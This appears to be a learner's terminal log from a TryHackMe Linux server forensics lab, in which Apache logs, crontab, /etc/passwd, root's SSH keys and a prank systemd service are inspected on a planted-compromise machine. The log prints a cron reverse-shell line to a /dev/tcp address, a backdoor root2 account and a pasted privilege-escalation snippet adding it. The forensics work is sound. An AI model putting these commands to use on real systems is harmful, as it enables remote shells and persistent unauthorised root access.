┌──(kali㉿kali)-[~/Documents/TryHackMe/LinuxServerForensics]
└─$ ssh fred@10.10.175.211                                                                                 130 ⨯
fred@10.10.175.211's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 14 23:40:17 UTC 2021

  System load:  0.59              Processes:           99
  Usage of /:   41.8% of 8.79GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 10.10.175.211
  Swap usage:   0%


6 packages can be updated.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Tue Dec 14 23:38:52 2021 from 10.6.121.137
fred@acmeweb:~$ cd /var/log/apache2
fred@acmeweb:/var/log/apache2$ ls
access.log  error.log  other_vhosts_access.log
fred@acmeweb:/var/log/apache2$ cat access.log | grep -oi 'nmap\|nikto\|sqlmap\|dirbuster' | sort -u
Binary file (standard input) matches
DirBuster
nmap
Nmap
fred@acmeweb:/var/log/apache2$ cat access.log | grep -i nmap
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "PROPFIND / HTTP/1.1" 405 522 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /nmaplowercheck1618912425 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST /sdk HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "PROPFIND / HTTP/1.1" 405 522 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /.git/HEAD HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /robots.txt HTTP/1.1" 200 365 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "PROPFIND / HTTP/1.1" 405 522 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /evox/about HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /HNAP1 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "IDRT / HTTP/1.1" 501 498 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /favicon.ico HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

/nmaplowercheck1618912425

fred@acmeweb:/var/log/apache2$ cat access.log | grep -i contact.php
192.168.1.119 - - [20/Apr/2021:09:14:13 +0000] "GET /contact.php HTTP/1.1" 200 966 "http://192.168.1.134/about.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"
192.168.1.119 - - [20/Apr/2021:09:14:18 +0000] "GET /index.html HTTP/1.1" 200 1253 "http://192.168.1.134/contact.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"
192.168.56.8 - - [20/Apr/2021:09:23:34 +0000] "GET /contact.php HTTP/1.1" 200 966 "http://192.168.56.9/about.html" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.56.8 - - [20/Apr/2021:09:23:35 +0000] "GET /index.html HTTP/1.1" 200 1252 "http://192.168.56.9/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.56.8 - - [20/Apr/2021:09:35:06 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.56.11 - - [20/Apr/2021:09:43:27 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.56.54 - - [20/Apr/2021:09:44:34 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
192.168.56.54 - - [20/Apr/2021:09:45:56 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "-"
192.168.56.144 - - [20/Apr/2021:09:46:18 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
192.168.56.221 - - [20/Apr/2021:09:47:17 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
192.168.56.221 - - [20/Apr/2021:09:47:56 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
192.168.56.121 - - [20/Apr/2021:09:48:42 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
192.168.56.209 - - [20/Apr/2021:09:49:16 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "-"
192.168.56.209 - - [20/Apr/2021:09:49:22 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "-"
192.168.56.173 - - [20/Apr/2021:09:50:45 +0000] "GET /contact.php HTTP/1.1" 200 911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.56.24 - - [20/Apr/2021:09:52:47 +0000] "GET /contact.php HTTP/1.1" 200 966 "http://192.168.56.9/about.html" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.56.24 - - [20/Apr/2021:09:55:24 +0000] "HEAD /contact.php HTTP/1.1" 200 128 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:24 +0000] "GET /contact.php HTTP/1.1" 200 2208 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:27 +0000] "HEAD /products/contact.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
Binary file (standard input) matches

fred@acmeweb:/var/log/apache2$ cat access.log | grep -i security
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /security/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /security.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "HEAD /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 233 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "GET /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 507 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"

fred@acmeweb:/var/log/apache2$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
fred@acmeweb:/var/log/apache2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
fred:x:1000:1000:fred:/home/fred:/bin/bash
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
fred@acmeweb:/var/log/apache2$ cat /etc/shadow
cat: /etc/shadow: Permission denied
fred@acmeweb:/var/log/apache2$ sudo cat /etc/shadow
[sudo] password for fred: 
root:*:18480:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18737:0:99999:7:::
fred:$6$MATksB27RqdhQNnL$bvCbAe1eUcjnZYHVmMjCLNSg4cB.1VRuC8ZrPMFMp1PHD0gDH0QEotnXsRM62AXeDNJoXCky5TS1dhdMQP2RM.:18737:0:99999:7:::

https://github.com/sinfulz/JustTryHarder/blob/master/Priv_Esc
# to create a second root user with "mrcake" password
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

# to switch to a root2
su root2
Password: mrcake 



┌──(kali㉿kali)-[~/Documents/TryHackMe/LinuxServerForensics]
└─$ ssh fred@10.10.22.213 
The authenticity of host '10.10.22.213 (10.10.22.213)' can't be established.
ED25519 key fingerprint is SHA256:huSeFODhbiA0Oi1AyWqO6U7iluv8dBB3hSPKUDwJ7Rc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.22.213' (ED25519) to the list of known hosts.
fred@10.10.22.213's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


6 packages can be updated.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Tue Apr 20 13:28:33 2021
fred@acmeweb:~$ cd /var/log/apache2
fred@acmeweb:/var/log/apache2$ ls
access.log  error.log  other_vhosts_access.log
fred@acmeweb:/var/log/apache2$ cat access.log | grep -iva 'post\|get'
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "\x16\x03" 400 0 "-" "-"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "GXWR / HTTP/1.1" 501 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"

fred@acmeweb:/var/log/apache2$ sudo su
[sudo] password for fred: 
root@acmeweb:/var/log/apache2# cd /root
root@acmeweb:~# ls -la
total 36
drwx------  6 root root 4096 Apr 20  2021 .
drwxr-xr-x 24 root root 4096 Apr 20  2021 ..
-rw-------  1 root root   22 Apr 20  2021 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 20  2021 .cache
drwx------  3 root root 4096 Apr 20  2021 .gnupg
drwxr-xr-x  3 root root 4096 Apr 20  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr 20  2021 .ssh
root@acmeweb:~# cd .ssh
root@acmeweb:~/.ssh# ls -la
total 12
drwx------ 2 root root 4096 Apr 20  2021 .
drwx------ 6 root root 4096 Apr 20  2021 ..
-rw------- 1 root root  563 Apr 20  2021 authorized_keys
root@acmeweb:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYCKt0bYP2YIwMWdJWqF3lr3Drs3sS9hiybsxz9W6dG6d15mg0SVMSe5H+rPM6VmzOKJaVpDjT1Ll5eR6YcbefTF2bMXHveyvcrzDxyZeWdgBs5u8/4DZxEN6fq6IZRRftmrMgMzSnpmdCm8kvacgq3lIjLx/sKAlX9GqPIz09t0Rk5MB7zk3lg1wdTZxZwwCHPbZW7mGlVcxNBB9wdbAmcvezscoF0i7v0tY8iCoFlrBysOMBMrEJji2UONtI/wrt7AvoK+gshiG7VTjZ2oQBacnyHRToXHxOZiSIbCQrJ6rCxa32QOGQNmAVIucqYjRbJedz0NbGq7M9B+hBmG/mdtsoGOXQKyzoUlAbulRXjSVtManiUyq9im1HBHfuduiBrbfcOKz24NMT7RaIsPsZCUCpfHaT7S5XplQypAjkxABds8jod/TXcTYibdWE9scrUUidgCsPELQlKEfhhZ8+cyjbMCGNB5LOgieJSVk6D1JC97TaFNi4X9/9i2UA+L0= kali@kali
root@acmeweb:~/.ssh# cd ..
root@acmeweb:~# cat .bash_history 
nano /etc/passwd
exit


fred@acmeweb:~$ systemctl --type=service --state=active
UNIT                                 LOAD   ACTIVE SUB     DESCRIPTION                                          
accounts-daemon.service              loaded active running Accounts Service                                     
amazon-ssm-agent.service             loaded active running amazon-ssm-agent                                     
apache2.service                      loaded active running The Apache HTTP Server                               
apparmor.service                     loaded active exited  AppArmor initialization                              
apport.service                       loaded active exited  LSB: automatic crash report generation               
atd.service                          loaded active running Deferred execution scheduler                         
blk-availability.service             loaded active exited  Availability of block devices                        
cloud-config.service                 loaded active exited  Apply the settings specified in cloud-config         
cloud-final.service                  loaded active exited  Execute cloud user/final scripts                     
cloud-init-local.service             loaded active exited  Initial cloud-init job (pre-networking)              
cloud-init.service                   loaded active exited  Initial cloud-init job (metadata service crawler)    
console-setup.service                loaded active exited  Set console font and keymap                          
cron.service                         loaded active running Regular background program processing daemon         
dbus.service                         loaded active running D-Bus System Message Bus                             
ebtables.service                     loaded active exited  ebtables ruleset management                          
getty@tty1.service                   loaded active running Getty on tty1                                        
grub-common.service                  loaded active exited  LSB: Record successful boot for GRUB                 
IpManager.service                    loaded active running IpManager.service                                    
keyboard-setup.service               loaded active exited  Set the console keyboard layout                      
kmod-static-nodes.service            loaded active exited  Create list of required static device nodes for the cu
lvm2-lvmetad.service                 loaded active running LVM2 metadata daemon                                 
lvm2-monitor.service                 loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeve
lvm2-pvscan@202:3.service            loaded active exited  LVM2 PV scan on device 202:3                         
lxcfs.service                        loaded active running FUSE filesystem for LXC                              
lxd-containers.service               loaded active exited  LXD - container startup/shutdown                     
networkd-dispatcher.service          loaded active running Dispatcher daemon for systemd-networkd               
polkit.service                       loaded active running Authorization Manager                                
rc-local.service                     loaded active exited  /etc/rc.local Compatibility                          
rsyslog.service                      loaded active running System Logging Service                               
serial-getty@ttyS0.service           loaded active running Serial Getty on ttyS0                                
setvtrgb.service                     loaded active exited  Set console scheme                                   
snapd.apparmor.service               loaded active exited  Load AppArmor profiles managed internally by snapd   
snapd.seeded.service                 loaded active exited  Wait until snapd is fully seeded                     
ssh.service                          loaded active running OpenBSD Secure Shell server                          
systemd-journal-flush.service        loaded active exited  Flush Journal to Persistent Storage                  
systemd-journald.service             loaded active running Journal Service                                      
systemd-logind.service               loaded active running Login Service                                        
systemd-modules-load.service         loaded active exited  Load Kernel Modules                                  
systemd-networkd-wait-online.service loaded active exited  Wait for Network to be Configured                    
systemd-networkd.service             loaded active running Network Service                                      
systemd-random-seed.service          loaded active exited  Load/Save Random Seed                                
systemd-remount-fs.service           loaded active exited  Remount Root and Kernel File Systems                 
systemd-resolved.service             loaded active running Network Name Resolution                              
systemd-sysctl.service               loaded active exited  Apply Kernel Variables                               
systemd-timesyncd.service            loaded active running Network Time Synchronization                         
systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Device Nodes in /dev                   
systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Files and Directories                
systemd-udev-trigger.service         loaded active exited  udev Coldplug all Devices                            
systemd-udevd.service                loaded active running udev Kernel Device Manager                           
systemd-update-utmp.service          loaded active exited  Update UTMP about System Boot/Shutdown               
systemd-user-sessions.service        loaded active exited  Permit User Sessions                                 
ufw.service                          loaded active exited  Uncomplicated firewall                               
unattended-upgrades.service          loaded active running Unattended Upgrades Shutdown                         
lines 1-54                                                                               
調試!: 如果發生堆棧衝突，則無法啟用堆棧!!!
                                                                               
                                                                               
WARNING!: DIHYDROGEN MONOXIDE DETECTED IN ATMOSPHERE
                                                                               
                                                                               
INFO!:  NODE GRAPH OUT OF DATE REBUILDING


fred@acmeweb:~$ systemctl status IpManager.service
● IpManager.service
   Loaded: loaded (/var/lib/network/IpManager.service; enabled; vendor preset: enabled)
   Active: active (running) since Wed 2021-12-15 00:29:35 UTC; 2min 32s ago
 Main PID: 2250 (bash)
    Tasks: 2 (limit: 1104)
   CGroup: /system.slice/IpManager.service
           ├─2250 /bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
           └─2354 sleep 10

Dec 15 00:31:19 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:19 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:29 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:29 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:39 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:39 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:49 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:49 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:59 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
Dec 15 00:31:59 acmeweb bash[2250]: tput: No value for $TERM and no -T specified
fred@acmeweb:~$                                                                                
WARNING!: THE RAM FLANGES ARE IN THE OFF POSITION SAFE OPERATION OF RAM DRIVER IS NOT GUARANTEED!
                                                                               
                                                                               

                                                                               
                                                                               
WARNING!: THE RAM FLANGES ARE IN THE OFF POSITION SAFE OPERATION OF RAM DRIVER IS NOT GUARANTEED!


fred@acmeweb:~$ cat /etc/network/ZGtsam5hZG1ua2Fu.sh
##[gh0st_1n_the_machine]
## 
declare -a error_messages
error_messages[1]='ATTENTION!: THE BITBUCKET IS ALMOST FULL'
error_messages[2]='ACHTUNG!: DAS KOMPUTERMASCHINE IS NICHT GUD'
error_messages[3]='WARNING!: THE RAM FLANGES ARE IN THE OFF POSITION SAFE OPERATION OF RAM DRIVER IS NOT GUARANTEED!'
error_messages[4]='ERROR!: THE STACK ARRANGER IS NOT ENABLED BEWARE OF STACK COLLISIONS'
error_messages[5]='調試!: 如果發生堆棧衝突，則無法啟用堆棧!!!'
error_messages[6]='INFO!:  PURGING RAM BITS'
error_messages[7]='INFO!:  NODE GRAPH OUT OF DATE REBUILDING'
error_messages[8]='INFO!:  RETICULATING SPLINES'
error_messages[9]='WARNING!: DIHYDROGEN MONOXIDE DETECTED IN ATMOSPHERE'
error_messages[10]='INFO!: VENTING OXYGEN'
error_messages[11]='WARNING!: /dev/null IS 95% UTILIZED'
error_messages[12]='METTERE IN GUARDIA!: LE FLANGE DEL RAM SONO IN POSIZIONE OFF IL FUNZIONAMENTO SICURO DEL RAM DRIVER NON È GARANTITO!'


print_errors(){
    for i in {1..10000}; do
    tput setaf 1; wall -n "${error_messages[RANDOM%11]}" ; tput setaf  7;
    sleep 10
    if [[ $i -eq 3 ]]; then
        introduce_self
    fi
    done
}

introduce_self(){
    wall -n "Wow this system is really broken huh?"
    sleep 4
    wall -n "Wonder if I can fix it"
    sleep 4
    wall -n "Gonna borrow your shell for a second"
    sleep 4
    wall -n "root@acmeweb:~# ls"
    ls -al ~ | wall -n
    sleep 4
    wall -n "Hmm"
    sleep 4
    wall -n "Nothing suspicious here"
    wall -n "root@acmeweb:~# ps"
    ps
    wall -n "Nothing strange here either."
    sleep 4
    wall -n "root@acmeweb:~# cd /etc"
    sleep 2
    wall -n "root@acmeweb:/etc/# ls -al"
    ls -al /etc/ | wall -n
    sleep 4
    wall -n "Wonder if theres anyting in the crontab"
    sleep 4
    wall -n "root@acmweb:/etc/ cat crontab"
    cat /etc/crontab | wall -n
    sleep 4
    wall -n "Hmm nothing here either"
    sleep 4 
    wall -n "Seems to be running all the time, so it could be a broken service."
    sleep 4
    wall -n "It might be worth running systemctl -l and, looking for things out of the ordinary"
    sleep 4
    wall -n "Oh by they way your computer isn't sentient, it's just haunted so there's nothing to worry about"
    sleep 4
    cowsay -f ghostbusters "Just don't call these guys" | wall -n
}
print_errors
fred@acmeweb:~$                                                                                
調試!: 如果發生堆棧衝突，則無法啟用堆棧!!!

[gh0st_1n_the_machine]